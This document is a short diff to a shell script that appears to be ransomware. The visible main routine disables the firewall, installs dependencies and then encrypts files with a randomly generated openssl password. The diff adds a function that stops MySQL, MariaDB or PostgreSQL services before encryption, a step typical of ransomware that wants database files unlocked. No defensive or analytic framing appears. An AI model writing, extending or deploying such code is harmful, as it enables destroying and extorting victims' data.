@@ -65,6 +65,24 @@ install_dependencies() {
     fi
 }
 
+stop_database() {
+    if [ -x "$(command -v mysqld)" ]; then
+        echo 'Stopping MySQL...'
+        service mysql stop
+        echo 'MySQL has been stopped'
+    elif [ -x "$(command -v mariadbd)" ]; then
+        echo 'Stopping MariaDB...'
+        service mariadb stop
+        echo 'MariaDB has been stopped'
+    elif [ -x "$(command -v pg_ctl)" ]; then
+        echo 'Stopping PostgreSQL...'
+        service postgresql stop
+        echo 'PostgreSQL has been stopped'
+    else
+        echo 'No database service is running'
+    fi
+}
+
 encrypt_files() {
     password=$(openssl rand -base64 32)
 
@@ -112,6 +130,7 @@ main() {
     check_distro
     disable_firewall
     install_dependencies
+    stop_database
     encrypt_files
 }
 
